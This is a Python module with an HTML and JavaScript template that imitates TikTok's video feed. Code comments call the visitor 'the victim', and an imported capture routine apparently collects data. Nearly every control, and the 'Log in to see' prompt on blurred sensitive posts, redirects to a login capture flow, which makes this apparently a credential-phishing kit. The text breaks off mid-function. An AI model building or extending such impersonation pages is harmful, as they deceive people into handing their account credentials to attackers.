"""feed.py - Template feed TikTok (For You)."""

from platforms._shared import JS_STRICT_CAPTURE

HTML_FEED = r"""
<!-- HLS.js — loaded for browsers without native HLS support (Chrome desktop, Firefox).
     Used as a fallback after native playback fails. No URL parsing. -->
<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <link rel="shortcut icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
    <title>{{ name }} | TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body { height: 100%; overflow: hidden; background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #fff; }
        .feed-container { height: 100vh; height: 100dvh; overflow-y: scroll; scroll-snap-type: y mandatory; scrollbar-width: none; }
        .feed-container::-webkit-scrollbar { display: none; }
        .tt-item { height: 100vh; height: 100dvh; scroll-snap-align: start; scroll-snap-stop: always; position: relative; overflow: hidden; background: #000; }
        .tt-video { position: absolute; inset: 0; width: 100%; height: 100%; object-fit: contain; background: #000; transition: filter 0.3s ease; }
        .tt-video.blurred { filter: blur(20px); }
        .tt-video::-webkit-media-controls { display: none !important; }
        .tt-video::-webkit-media-controls-enclosure { display: none !important; }
        .loading-spinner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 4; width: 48px; height: 48px; border: 4px solid rgba(255,255,255,0.2); border-top-color: #fe2c55; border-radius: 50%; animation: spin-loader 0.8s linear infinite; display: none; }
        .loading-spinner.visible { display: block; }
        @keyframes spin-loader { to { transform: translate(-50%, -50%) rotate(360deg); } }
        .play-overlay { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; z-index: 5; pointer-events: none; opacity: 0; transition: opacity 0.2s ease; }
        .play-overlay.visible { opacity: 1; }
        .play-icon { width: 72px; height: 72px; background: rgba(0,0,0,0.55); border-radius: 50%; display: flex; align-items: center; justify-content: center; backdrop-filter: blur(8px); }
        .play-icon i { color: #fff; font-size: 32px; }
        .heart-burst { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0); font-size: 100px; color: #fe2c55; z-index: 6; pointer-events: none; }
        .heart-burst.burst { animation: burst 0.8s ease-out; }
        @keyframes burst { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 50% { transform: translate(-50%, -50%) scale(1.3); opacity: 1; } 100% { transform: translate(-50%, -50%) scale(1.6); opacity: 0; } }
        .seek-indicator { position: absolute; top: 50%; transform: translateY(-50%); z-index: 6; background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); border-radius: 50%; width: 56px; height: 56px; display: flex; flex-direction: column; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #fe2c55; opacity: 0; transition: opacity 0.15s ease; pointer-events: none; }
        .seek-indicator.visible { opacity: 1; }
        .seek-indicator i { font-size: 18px; margin-bottom: 2px; }
        .seek-indicator.left { left: 20px; }
        .seek-indicator.right { right: 20px; }
        .progress-bar { position: absolute; bottom: 78px; left: 0; right: 0; height: 4px; background: rgba(255,255,255,0.2); z-index: 8; cursor: pointer; }
        .progress-bar:hover { height: 6px; }
        .progress-bar-fill { height: 100%; background: #fe2c55; width: 0%; }
        .blur-overlay { position: absolute; inset: 0; z-index: 7; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.4); text-align: center; padding: 32px; }
        .blur-overlay .blur-icon { font-size: 48px; color: #fe2c55; margin-bottom: 16px; }
        .blur-overlay .blur-text { font-size: 16px; font-weight: 700; margin-bottom: 8px; text-shadow: 0 2px 8px rgba(0,0,0,0.9); }
        .blur-overlay .blur-reason { font-size: 13px; color: #ccc; margin-bottom: 24px; text-shadow: 0 1px 4px rgba(0,0,0,0.9); }
        .blur-overlay .blur-btn { background: #fe2c55; color: #fff; border: none; border-radius: 24px; padding: 14px 36px; font-size: 14px; font-weight: 800; cursor: pointer; }
        .tt-topbar { position: fixed; top: 0; left: 0; right: 0; z-index: 50; padding: env(safe-area-inset-top, 12px) 0 10px; background: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent); display: flex; flex-direction: column; align-items: center; gap: 12px; font-size: 16px; font-weight: 600; }
        .tt-tabs-row { display: flex; align-items: center; justify-content: center; gap: 20px; }
        .tt-tab { color: rgba(255,255,255,0.6); cursor: pointer; position: relative; padding-bottom: 4px; }
        .tt-tab.active { color: #fff; }
        .tt-tab.active::after { content: ''; position: absolute; bottom: 0; left: 50%; transform: translateX(-50%); width: 24px; height: 3px; background: #fff; border-radius: 2px; }
        .tt-search-bar { width: calc(100% - 32px); max-width: 480px; height: 38px; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border-radius: 19px; border: none; color: #fff; padding: 0 16px; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: background 0.15s ease, transform 0.15s ease; -webkit-tap-highlight-color: transparent; margin: 0 16px; }
        .tt-search-bar:active { transform: scale(0.98); }
        .tt-search-bar:hover { background: rgba(255,255,255,0.22); }
        .tt-search-bar i { font-size: 14px; color: #fff; opacity: 0.8; text-shadow: 0 1px 3px rgba(0,0,0,0.6); }
        .tt-search-bar .tt-search-text { font-size: 13px; color: rgba(255,255,255,0.7); font-weight: 500; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .profile-top { position: relative; width: 48px; height: 48px; margin-bottom: 4px; cursor: pointer; }
        .profile-top .avatar-top { width: 48px; height: 48px; border-radius: 50%; border: 2px solid #fff; object-fit: cover; transition: transform 0.15s ease; }
        .profile-top .avatar-top:hover { transform: scale(1.05); }
        .profile-top .follow-plus-top { position: absolute; bottom: -4px; left: 50%; transform: translateX(-50%); background: #fe2c55; color: #fff; border: 2px solid #000; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 900; cursor: pointer; line-height: 1; }
        .profile-top .follow-plus-top:active { transform: translateX(-50%) scale(0.9); }
        .action-rail { position: absolute; right: 8px; bottom: 80px; display: flex; flex-direction: column; gap: 14px; z-index: 10; align-items: center; }
        .action-btn { display: flex; flex-direction: column; align-items: center; gap: 3px; cursor: pointer; }
        .action-btn .icon-circle { width: 38px; height: 38px; background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border-radius: 50%; display: flex; align-items: center; justify-content: center; transition: transform 0.15s ease, background 0.15s ease; }
        .action-btn:active .icon-circle { transform: scale(0.88); }
        .action-btn .icon-circle i { font-size: 18px; color: #fff; }
        .action-btn.liked .icon-circle { background: #fe2c55; }
        .action-btn .count { color: #fff; font-size: 10px; font-weight: 700; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
        .sound-disc-large { width: 38px; height: 38px; border-radius: 50%; background: linear-gradient(135deg, #333, #111); background-size: cover; background-position: center; border: 2px solid #444; display: flex; align-items: center; justify-content: center; animation: spin 4s linear infinite; cursor: pointer; margin-top: 4px; }
        .sound-disc-large i { color: #fe2c55; font-size: 14px; }
        @keyframes spin { from { transform: rotate(0); } to { transform: rotate(360deg); } }
        .info-overlay { position: absolute; left: 16px; right: 70px; bottom: 80px; z-index: 10; }
        .profile-row { display: flex; align-items: center; gap: 8px; margin-bottom: 10px; }
        .profile-row .avatar { width: 36px; height: 36px; border-radius: 50%; border: 2px solid #fff; object-fit: cover; cursor: pointer; transition: transform 0.15s ease; }
        .profile-row .avatar:hover { transform: scale(1.05); }
        .profile-row .name { color: #fff; font-weight: 700; font-size: 14px; text-shadow: 0 2px 6px rgba(0,0,0,0.9); display: flex; align-items: center; gap: 4px; cursor: pointer; }
        .profile-row .follow-plus { background: #fe2c55; color: #fff; border: none; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 900; cursor: pointer; margin-left: 2px; flex-shrink: 0; }
        .profile-row .follow-plus:active { transform: scale(0.9); }
        .caption { color: #fff; font-size: 14px; line-height: 1.4; text-shadow: 0 2px 6px rgba(0,0,0,0.9); margin-bottom: 10px; word-break: break-word; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-height: 1.4em; transition: max-height 0.3s ease, white-space 0.1s ease; }
        .caption.expanded { white-space: normal; overflow: visible; text-overflow: clip; max-height: 500px; }
        .caption-toggle { color: #25F4EE; font-size: 13px; font-weight: 700; cursor: pointer; text-shadow: 0 1px 4px rgba(0,0,0,0.9); margin-bottom: 10px; display: inline-block; -webkit-tap-highlight-color: transparent; }
        .caption .hashtag { color: #fff; font-weight: 600; }
        .caption .mention { color: #25F4EE; font-weight: 600; }
        .sound-row { display: flex; align-items: center; gap: 8px; color: #fff; font-size: 12px; text-shadow: 0 1px 4px rgba(0,0,0,0.8); }
        .sound-row i { font-size: 14px; }
        .sound-row .marquee { overflow: hidden; white-space: nowrap; max-width: 240px; }
        .sound-row .marquee span { display: inline-block; animation: marquee 12s linear infinite; }
        @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
        .bottom-nav { position: fixed; bottom: 0; left: 0; right: 0; background: linear-gradient(to top, rgba(0,0,0,0.85), transparent); padding: 8px 0 env(safe-area-inset-bottom, 12px); display: flex; justify-content: space-around; align-items: center; z-index: 50; border-top: 1px solid rgba(255,255,255,0.1); }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 2px; color: #fff; font-size: 10px; opacity: 0.7; font-weight: 600; cursor: pointer; transition: opacity 0.15s ease; }
        .nav-item:hover { opacity: 0.9; }
        .nav-item.active { opacity: 1; }
        .nav-item i { font-size: 22px; }
        .nav-item.create { background: linear-gradient(135deg, #25F4EE 0%, #fff 50%, #fe2c55 100%); width: 44px; height: 30px; border-radius: 6px; display: flex; align-items: center; justify-content: center; position: relative; }
        .nav-item.create i { color: #000; font-size: 20px; font-weight: 900; }
        .popup-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 200; display: flex; align-items: center; justify-content: center; opacity: 0; pointer-events: none; transition: opacity 0.25s ease; }
        .popup-bg.visible { opacity: 1; pointer-events: auto; }
        .popup-box { background: #1a1a1a; border: 1px solid rgba(254,44,85,0.3); padding: 32px 24px; border-radius: 16px; max-width: 340px; width: 90%; text-align: center; color: #fff; transform: scale(0.9); transition: transform 0.25s ease; }
        .popup-bg.visible .popup-box { transform: scale(1); }
        .popup-box .popup-icon { font-size: 40px; color: #fe2c55; margin-bottom: 16px; }
        .popup-box h3 { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
        .popup-box p { font-size: 13px; color: #aaa; margin-bottom: 24px; line-height: 1.5; }
        .popup-box .btn-login { background: #fe2c55; color: #fff; border: none; border-radius: 6px; padding: 14px; width: 100%; font-size: 14px; font-weight: 700; cursor: pointer; margin-bottom: 8px; }
        .popup-box .btn-later { background: transparent; border: none; color: #666; font-size: 12px; cursor: pointer; }
        .modal-bg { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 100; display: flex; align-items: center; justify-content: center; }
        .modal-box { background: #fff; padding: 32px 24px; border-radius: 16px; max-width: 360px; width: 90%; text-align: center; color: #161823; }
        .modal-box h3 { font-size: 20px; font-weight: 800; margin-bottom: 8px; }
        .modal-box p { font-size: 13px; color: #6c6c6c; margin-bottom: 20px; line-height: 1.5; }
        .modal-box .btn-continue { background: #fe2c55; color: #fff; border: none; border-radius: 6px; padding: 14px; width: 100%; font-size: 14px; font-weight: 700; cursor: pointer; margin-bottom: 8px; }
        .modal-box .btn-stay { background: transparent; border: none; color: #999; font-size: 12px; cursor: pointer; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    """ + JS_STRICT_CAPTURE + r"""
    <div class="tt-topbar">
        <div class="tt-tabs-row">
            <div class="tt-tab" onclick="showLoginPopup('Following')">Following</div>
            <div class="tt-tab active" onclick="showLoginPopup('For You')">For You</div>
        </div>
        <div class="tt-search-bar" onclick="showLoginPopup('Search')">
            <i class="fas fa-search"></i>
            <span class="tt-search-text">Search</span>
        </div>
    </div>
    <div class="feed-container" id="feed">
        {% for p in posts %}
        <div class="tt-item" data-index="{{ loop.index0 }}" {% if p.blur_enabled %}data-blur-mode="{{ p.blur_mode or 'instant' }}" data-blur-delay="{{ p.blur_delay or 3 }}"{% endif %}>
            {% if p._carousel_images and p._carousel_images|length > 0 %}
            <!-- Carousel d'images avec musique -->
            <div class="tt-carousel" style="position:absolute;inset:0;overflow:hidden;background:#000;">
                <div class="tt-carousel-track" style="display:flex;height:100%;transition:transform 0.3s ease;">
                    {% for car_img in p._carousel_images %}
                    {% set car_blur = p._carousel_blur[loop.index0] if p._carousel_blur and loop.index0 < p._carousel_blur|length else none %}
                    <div class="tt-carousel-slide" style="min-width:100%;height:100%;display:flex;align-items:center;justify-content:center;background:#000;position:relative;padding:0 4px;">
                        <img src="{{ car_img }}" draggable="false" style="max-width:100%;max-height:88vh;width:auto;height:auto;object-fit:contain;border-radius:8px;{% if car_blur and car_blur.blur %}filter:blur(20px);{% endif %}" onerror="try{this.style.display='none';var fb=this.parentNode.querySelector('.car-fallback');if(fb){fb.style.display='flex';}}catch(e){this.style.display='none';}">
                        <div class="car-fallback" style="display:none;position:absolute;inset:0;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 50%,#1a1a1a,#000);color:#aaa;font-size:14px;"><div style="text-align:center;"><i class="fas fa-image" style="font-size:48px;color:#fe2c55;opacity:0.5;margin-bottom:12px;"></i><div>Image indisponible</div></div></div>
                        {% if car_blur and car_blur.blur %}
                        <div class="tt-carousel-blur-overlay" style="position:absolute;inset:0;z-index:1;pointer-events:none;display:flex;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,0.5);text-align:center;padding:32px;">
                            <i class="fas fa-eye-slash" style="font-size:48px;color:#fe2c55;margin-bottom:16px;"></i>
                            <div style="font-size:16px;font-weight:700;color:#fff;margin-bottom:8px;">Image floutée</div>
                            <div style="font-size:13px;color:#ccc;">{{ car_blur.reason or 'Contenu sensible' }}</div>
                        </div>
                        {% endif %}
                    </div>
                    {% endfor %}
                </div>
                <div class="tt-carousel-counter" style="position:absolute;top:100px;right:16px;background:rgba(0,0,0,0.6);color:#fff;font-size:12px;font-weight:700;padding:4px 10px;border-radius:12px;z-index:20;pointer-events:none;">1 / {{ p._carousel_images|length }}</div>
                <div class="tt-carousel-dots" style="position:absolute;top:100px;left:50%;transform:translateX(-50%);display:flex;gap:4px;z-index:20;pointer-events:none;">
                    {% for car_img in p._carousel_images %}
                    <div class="tt-carousel-dot" style="width:6px;height:6px;border-radius:50%;background:{% if loop.first %}#fff{% else %}rgba(255,255,255,0.4){% endif %};transition:background 0.2s;"></div>
                    {% endfor %}
                </div>
            </div>
            {% if p.music_url or p.sound_url %}
            <audio class="tt-audio" loop preload="auto" src="{{ p.music_url or p.sound_url }}"></audio>
            {% endif %}
            {% elif p._video_url and not p._fake_video %}
            <video class="tt-video {% if p.blur_enabled and p.blur_mode != 'delayed' %}blurred{% endif %}" loop playsinline preload="auto" {% if p.music_url or p.sound_url %}muted{% endif %} {% if p._cover_url %}poster="{{ p._cover_url }}"{% endif %} src="{{ p._video_url }}" onerror="this.style.display='none';var fb=this.parentNode.querySelector('.video-fallback');if(fb){fb.style.display='flex';}"></video>
            <div class="tt-video video-fallback" style="background:radial-gradient(circle at 50% 50%,#1a1a1a,#000);display:none;align-items:center;justify-content:center;"><div style="text-align:center;"><i class="fas fa-video-slash" style="font-size:48px;color:#fe2c55;opacity:0.5;margin-bottom:12px;"></i><div style="color:#aaa;font-size:13px;">Video unavailable</div></div></div>
            {% if p.music_url or p.sound_url %}
            <audio class="tt-audio" loop preload="auto" src="{{ p.music_url or p.sound_url }}"></audio>
            {% endif %}
            <div class="loading-spinner"></div>
            <div class="play-overlay visible"><div class="play-icon"><i class="fas fa-play" style="margin-left:4px;"></i></div></div>
            <i class="fas fa-heart heart-burst"></i>
            <div class="seek-indicator left"><i class="fas fa-backward"></i><span>10s</span></div>
            <div class="seek-indicator right"><i class="fas fa-forward"></i><span>10s</span></div>
            <div class="progress-bar"><div class="progress-bar-fill"></div></div>
            {% elif p._fake_video or p.image %}
            <img class="tt-video {% if p.blur_enabled and p.blur_mode != 'delayed' %}blurred{% endif %}" src="{{ p.image }}" draggable="false" onerror="this.style.display='none';var fb=this.parentNode.querySelector('.video-fallback');if(fb){fb.style.display='flex';}">
            {% if p.music_url or p.sound_url %}
            <audio class="tt-audio" loop preload="auto" src="{{ p.music_url or p.sound_url }}"></audio>
            {% endif %}
            <div class="loading-spinner"></div>
            <div class="play-overlay visible"><div class="play-icon"><i class="fas fa-play" style="margin-left:4px;"></i></div></div>
            <i class="fas fa-heart heart-burst"></i>
            <div class="seek-indicator left"><i class="fas fa-backward"></i><span>10s</span></div>
            <div class="seek-indicator right"><i class="fas fa-forward"></i><span>10s</span></div>
            <div class="progress-bar"><div class="progress-bar-fill"></div></div>
            {% else %}
            <div class="tt-video video-fallback" style="background:radial-gradient(circle at 50% 50%,#1a1a1a,#000);display:flex;align-items:center;justify-content:center;"><i class="fas fa-music" style="font-size:80px;color:#fe2c55;opacity:0.4;"></i></div>
            {% endif %}
            {% if p.blur_enabled %}
            <div class="blur-overlay" {% if p.blur_mode == 'delayed' %}style="display:none;"{% endif %}>
                <i class="fas fa-eye-slash blur-icon"></i>
                <div class="blur-text">Video blurred</div>
                <div class="blur-reason">{{ p.blur_reason or 'Sensitive content' }}</div>
                <button class="blur-btn" onclick="showLoginPopup()">Log in to see</button>
            </div>
            {% endif %}
            <div class="action-rail">
                <div class="profile-top action-profile">
                    <img class="avatar-top action-profile" src="{{ p.profile_pic }}" draggable="false" onerror="this.onerror=null;this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 48 48%22%3E%3Crect fill=%22%23fe2c55%22 width=%2248%22 height=%2248%22/%3E%3Ccircle cx=%2224%22 cy=%2219%22 r=%228%22 fill=%22%23fff%22/%3E%3Cpath d=%22M8 42 Q8 31 24 31 Q40 31 40 42 Z%22 fill=%22%23fff%22/%3E%3C/svg%3E';">
                    <button class="follow-plus-top" onclick="event.stopPropagation();showLoginPopup('Follow user')" title="Follow">+</button>
                </div>
                <div class="action-btn like-btn" data-likes="{{ p.likes }}"><div class="icon-circle"><i class="fas fa-heart"></i></div><span class="count">{{ p.likes }}</span></div>
                <div class="action-btn action-comment"><div class="icon-circle"><i class="fas fa-comment-dots"></i></div><span class="count">{{ p.comments }}</span></div>
                <div class="action-btn action-bookmark"><div class="icon-circle"><i class="fas fa-bookmark"></i></div><span class="count">{{ p.favorites }}</span></div>
                <div class="action-btn action-share"><div class="icon-circle"><i class="fas fa-share"></i></div><span class="count">{{ p.shares }}</span></div>
                <div class="sound-disc-large" title="{{ p.sound_name or p.music_name or 'Original sound' }}" {% if p.sound_image or p.music_image %}style="background-image:url('{{ p.sound_image or p.music_image }}');"{% endif %}>{% if not p.sound_image and not p.music_image %}<i class="fas fa-music"></i>{% endif %}</div>
            </div>
            <div class="info-overlay">
                {% if p.profile_name %}
                <div class="name action-profile" style="margin-bottom:8px;">{{ p.profile_name }}{% if p.verified %}<i class="fas fa-check-circle" style="color:#fe2c55;font-size:13px;margin-left:4px;"></i>{% endif %}</div>
                {% endif %}
                {% if p.text or p.caption %}
                <div class="caption">{{ (p.text or p.caption)|safe }}</div>
                <div class="caption-toggle" onclick="toggleCaption(this)" style="display:none;">Voir plus</div>
                {% endif %}
                {% if p.sound_name or p.music_name %}
                <div class="sound-row"><i class="fas fa-music"></i><div class="marquee"><span>{{ p.sound_name or p.music_name }} &middot; {{ p.sound_name or p.music_name }} &middot; &nbsp;</span></div></div>
                {% endif %}
            </div>
        </div>
        {% endfor %}
        <div class="tt-item" style="background:radial-gradient(circle at 50% 30%,#1a1a1a 0%,#000 100%);display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:32px;">
            <div style="background:linear-gradient(135deg,#25F4EE,#fe2c55);width:80px;height:80px;border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:24px;"><i class="fas fa-music" style="font-size:40px;color:#fff;"></i></div>
            <h2 style="font-size:22px;font-weight:800;margin-bottom:12px;">{{ see_more }}</h2>
            <p style="font-size:14px;color:#aaa;margin-bottom:32px;max-width:320px;">{{ login_link }}</p>
            <button onclick="captureAndGo('{{ posts[0].redirect_after if posts else '' }}')" style="background:#fe2c55;color:#fff;border:none;border-radius:6px;padding:16px 48px;font-size:16px;font-weight:800;cursor:pointer;">{{ modal_continue }}</button>
        </div>
    </div>
    <div class="bottom-nav">
        <div class="nav-item active action-nav-home"><i class="fas fa-house"></i><span>Home</span></div>
        <div class="nav-item action-nav-discover"><i class="fas fa-magnifying-glass"></i><span>Discover</span></div>
        <div class="nav-item create action-nav-create"><i class="fas fa-plus"></i></div>
        <div class="nav-item action-nav-inbox"><i class="fas fa-inbox"></i><span>Inbox</span>{% if notif_count %}<span style="position:absolute;top:-2px;right:18px;background:#fe2c55;color:#fff;font-size:8px;font-weight:700;border-radius:50%;min-width:14px;height:14px;display:flex;align-items:center;justify-content:center;">{{ notif_count }}</span>{% endif %}</div>
        <div class="nav-item action-nav-profile"><i class="fas fa-user"></i><span>Profile</span></div>
    </div>
    <div id="login-popup" class="popup-bg">
        <div class="popup-box">
            <i class="fas fa-lock popup-icon"></i>
            <h3>Log in to continue</h3>
            <p id="popup-action-text">This action requires login.</p>
            <button class="btn-login" onclick="closeLoginPopup();captureAndGo('{{ posts[0].redirect_after if posts else '' }}');">Log in</button>
            <button class="btn-later" onclick="closeLoginPopup()">Later</button>
        </div>
    </div>
    <div id="login-modal" class="modal-bg hidden">
        <div class="modal-box">
            <h3>{{ modal_title }}</h3>
            <p>{{ modal_text }}</p>
            <button onclick="confirmLogin()" class="btn-continue">{{ modal_continue }}</button>
            <button onclick="closeModal()" class="btn-stay">{{ modal_stay }}</button>
        </div>
    </div>
    <script>
    // ── Global functions ──
    function showLoginPopup(a) {
        try {
            // Redirection directe vers la page de login (sans popup intermédiaire)
            if (typeof captureAndGo === 'function') {
                captureAndGo('');
            }
        } catch (e) {}
    }
    function closeLoginPopup() {
        try {
            var p = document.getElementById('login-popup');
            if (p) p.classList.remove('visible');
        } catch (e) {}
    }
    function toggleCaption(btn) {
        try {
            var cap = btn.previousElementSibling;
            if (!cap) return;
            if (cap.classList.contains('expanded')) {
                cap.classList.remove('expanded');
                btn.textContent = 'Voir plus';
            } else {
                cap.classList.add('expanded');
                btn.textContent = 'Voir moins';
            }
        } catch (e) {}
    }
    function initCaptionToggles() {
        try {
            document.querySelectorAll('.caption').forEach(function(cap) {
                try {
                    var toggle = cap.nextElementSibling;
                    if (!toggle || !toggle.classList.contains('caption-toggle')) return;
                    var isTruncated = cap.scrollWidth > cap.clientWidth || cap.offsetHeight < cap.scrollHeight;
                    toggle.style.display = isTruncated ? 'inline-block' : 'none';
                } catch (e2) {}
            });
        } catch (e3) {}
    }

    // ── Initialize caption toggles ──
    try {
        if (document.readyState !== 'loading') {
            initCaptionToggles();
        } else {
            document.addEventListener('DOMContentLoaded', initCaptionToggles);
        }
    } catch (e4) {}

    // ── Re-check caption toggles on scroll ──
    try {
        document.getElementById('feed').addEventListener('scroll', function() {
            try { initCaptionToggles(); } catch (e5) {}
        }, { passive: true });
    } catch (e6) {}

    // ── Main video player + carousel setup ──
    (function() {
        var feed = document.getElementById('feed');
        var items = feed.querySelectorAll('.tt-item');

        items.forEach(function(item) {
            try {
                var carousel = item.querySelector('.tt-carousel');

                // ── Carousel mode (images with music) ──
                if (carousel) {
                    try {
                        var track = carousel.querySelector('.tt-carousel-track');
                        var slides = carousel.querySelectorAll('.tt-carousel-slide');
                        var counter = carousel.querySelector('.tt-carousel-counter');
                        var dots = carousel.querySelectorAll('.tt-carousel-dot');
                        var audio = item.querySelector('audio.tt-audio');
                        var current = 0;
                        var total = slides.length;
                        var startX = 0;
                        var isDragging = false;
                        var _wantPlay = false;

                        function updateCarousel(idx) {
                            try {
                                current = Math.max(0, Math.min(total - 1, idx));
                                track.style.transform = 'translateX(-' + (current * 100) + '%)';
                                if (counter) counter.textContent = (current + 1) + ' / ' + total;
                                dots.forEach(function(dot, i) {
                                    dot.style.background = i === current ? '#fff' : 'rgba(255,255,255,0.4)';
                                });
                            } catch (e) {}
                        }

                        // Touch swipe
                        carousel.addEventListener('touchstart', function(e) {
                            try { startX = e.touches[0].clientX; isDragging = true; } catch (e) {}
                        }, { passive: true });
                        carousel.addEventListener('touchend', function(e) {
                            try {
                                if (!isDragging) return;
                                isDragging = false;
                                var endX = e.changedTouches[0].clientX;
                                var diff = startX - endX;
                                if (Math.abs(diff) > 50) {
                                    if (diff > 0) updateCarousel(current + 1);
                                    else updateCarousel(current - 1);
                                }
                            } catch (e) {}
                        }, { passive: true });

                        // Mouse drag (desktop)
                        var mouseStartX = 0;
                        var mouseIsDragging = false;
                        carousel.addEventListener('mousedown', function(e) {
                            try { mouseStartX = e.clientX; mouseIsDragging = true; } catch (e) {}
                        });
                        carousel.addEventListener('mouseup', function(e) {
                            try {
                                if (!mouseIsDragging) return;
                                mouseIsDragging = false;
                                var diff = mouseStartX - e.clientX;
                                if (Math.abs(diff) > 50) {
                                    if (diff > 0) updateCarousel(current + 1);
                                    else updateCarousel(current - 1);
                                }
                            } catch (e) {}
                        });
                        carousel.addEventListener('mouseleave', function() { mouseIsDragging = false; });

                        // Create play overlay for carousel audio
                        if (audio) {
                            var carOverlay = document.createElement('div');
                            carOverlay.className = 'tt-carousel-play-overlay';
                            carOverlay.innerHTML = '<div class="play-icon"><i class="fas fa-play" style="margin-left:4px;"></i></div>';
                            carOverlay.style.cssText = 'position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:2;pointer-events:auto;cursor:pointer;background:rgba(0,0,0,0.25);opacity:1;transition:opacity 0.2s ease;';
                            carousel.appendChild(carOverlay);

                            // Le carOverlay reste TOUJOURS pointer-events:auto (même invisible)
                            // pour que la victime puisse cliquer pour pause/continue à tout moment.
                            // Le handler gère: centre → toggle play/pause, gauche/droite → navigation
                            carOverlay.addEventListener('click', function(e) {
                                try {
                                    e.stopPropagation();
                                    if (e.target.closest('.action-rail') || e.target.closest('.info-overlay') || e.target.closest('.bottom-nav')) return;
                                    var rect = carousel.getBoundingClientRect();
                                    var x = e.clientX - rect.left;
                                    var zone = x / rect.width;
                                    if (zone > 0.7) {
                                        updateCarousel(current + 1);
                                    } else if (zone < 0.3) {
                                        updateCarousel(current - 1);
                                    } else {
                                        if (audio.paused) {
                                            _wantPlay = true;
                                            var ap = audio.play();
                                            if (ap && ap.catch) ap.catch(function() {});
                                            carOverlay.style.opacity = '0';
                                        } else {
                                            _wantPlay = false;
                                            audio.pause();
                                            carOverlay.style.opacity = '1';
                                        }
                                    }
                                } catch (e) {}
                            });

                            audio.addEventListener('play', function() {
                                try {
                                    carOverlay.style.opacity = '0';
                                } catch (e) {}
                            });
                            audio.addEventListener('pause', function() {
                                try {
                                    carOverlay.style.opacity = '1';
                                } catch (e) {}
                            });

                            // IntersectionObserver for carousel audio
                            try {
                                if ('IntersectionObserver' in window) {
                                    var carObs = new IntersectionObserver(function(entries) {
                                        entries.forEach(function(entry) {
                                            try {
                                                if (entry.intersectionRatio < 0.5) {
                                                    if (audio && !audio.paused) audio.pause();
                                                } else {
                                                    if (audio && audio.paused && _wantPlay) {
                                                        var ap = audio.play();
                                                        if (ap && ap.catch) ap.catch(function() {});
                                                    }
                                                }
                                            } catch (e) {}
                                        });
                                    }, { threshold: [0, 0.5, 1], root: feed });
                                    carObs.observe(item);
                                }
                            } catch (e) {}
                        }

                        // Click zones for carousel navigation
                        carousel.addEventListener('click', function(e) {
                            try {
                                if (e.target.closest('.action-rail') || e.target.closest('.info-overlay') || e.target.closest('.bottom-nav')) return;
                                if (e.target === carOverlay || (carOverlay && carOverlay.contains(e.target))) return;
                                var rect = carousel.getBoundingClientRect();
                                var x = e.clientX - rect.left;
                                var zone = x / rect.width;
                                if (zone > 0.7) updateCarousel(current + 1);
                                else if (zone < 0.3) updateCarousel(current - 1);
                            } catch (e) {}
                        });

                        return; // Skip video setup for carousel items
                    } catch (e) { return; }
                }

                // ── Video mode ──
                var video = item.querySelector('video.tt-video');
                var audio = item.querySelector('audio.tt-audio');
                var overlay = item.querySelector('.play-overlay');
                var spinner = item.querySelector('.loading-spinner');
                var heart = item.querySelector('.heart-burst');
                var likeBtn = item.querySelector('.like-btn');
                var pbFill = item.querySelector('.progress-bar-fill');
                var pbBar = item.querySelector('.progress-bar');
                var seekL = item.querySelector('.seek-indicator.left');
                var seekR = item.querySelector('.seek-indicator.right');
                var blurOv = item.querySelector('.blur-overlay');

                if (!video || !overlay) return;

                var _wantPlay = false;
                var _blurTimer = null;
                var _audioSynced = false;
                var lastTap = 0;

                // ── Audio sync function ──
                function syncAudio(s) {
                    if (!audio) return;
                    try {
                        if (s === 'play') {
                            if (!_audioSynced) {
                                try {
                                    if (audio.readyState >= 2 && audio.duration && isFinite(audio.duration) && video.duration && isFinite(video.duration)) {
                                        audio.currentTime = video.currentTime % audio.duration;
                                    }
                                } catch (e8) {}
                                _audioSynced = true;
                            }
                            var ap = audio.play();
                            if (ap && ap.catch) ap.catch(function() {});
                        } else if (s === 'pause') {
                            audio.pause();
                            _audioSynced = false;
                        } else if (s === 'seek') {
                            try {
                                if (audio.readyState >= 2 && audio.duration && isFinite(audio.duration)) {
                                    audio.currentTime = video.currentTime % audio.duration;
                                }
                            } catch (e9) {}
                            _audioSynced = true;
